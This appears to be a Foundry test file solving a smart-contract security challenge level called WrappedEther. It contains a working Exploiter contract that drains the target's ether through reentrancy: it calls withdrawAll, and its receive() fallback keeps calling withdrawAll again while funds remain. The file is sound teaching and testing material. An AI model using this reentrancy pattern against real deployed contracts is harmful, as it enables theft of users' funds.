// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

contract Exploiter {
    WrappedEther target;
    uint256 private constant AMOUNT = 0.09 ether;

    constructor(WrappedEther _target) {
        target = _target;
    }

    function attack() external payable {
        target.deposit{value: AMOUNT}(address(this));
        // withdrawAll спровоцирует reentrancy
        target.withdrawAll();
    }

    // для reentrancy
    receive() external payable {
        if(address(target).balance >= AMOUNT) {
            target.withdrawAll();
        }
    }
}


// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        Exploiter exploiter = new Exploiter(instance);
        exploiter.attack{value: 0.09 ether}();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
